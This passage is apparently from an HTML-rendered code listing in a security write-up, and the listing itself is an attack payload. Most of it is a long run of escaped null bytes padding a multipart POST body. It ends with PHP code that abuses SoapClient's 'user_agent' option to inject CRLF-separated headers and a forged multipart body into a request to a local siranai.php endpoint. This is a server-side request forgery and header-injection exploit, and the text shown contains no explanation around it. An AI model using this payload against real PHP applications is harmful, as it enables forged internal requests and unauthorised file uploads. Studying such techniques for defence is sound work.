x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n--229aafba818c5da83cd0547a3a0002d5--\r\n&quot;</span>;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/siranai.php&quot;</span>, <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;Enterpr1se\r\n&quot;</span> . <span class="hljs-string">&quot;Cookie: PHPSESSION=16aaab9fb\r\nContent-Type: multipart/form-data; boundary=&quot;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$postdata</span>,<span class="hljs-number">2</span>,<span class="hljs-number">32</span>).<span class="hljs-string">&quot;\r\nConnection: keep-alive\r\nAccept: */*\r\nContent-Length: 10416&quot;</span>.<span class="hljs-string">&quot;\r\n\r\n&quot;</span>.<span class="hljs-variable">$postdata</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/siranai.php&quot;</span>));<br>&#125; <span 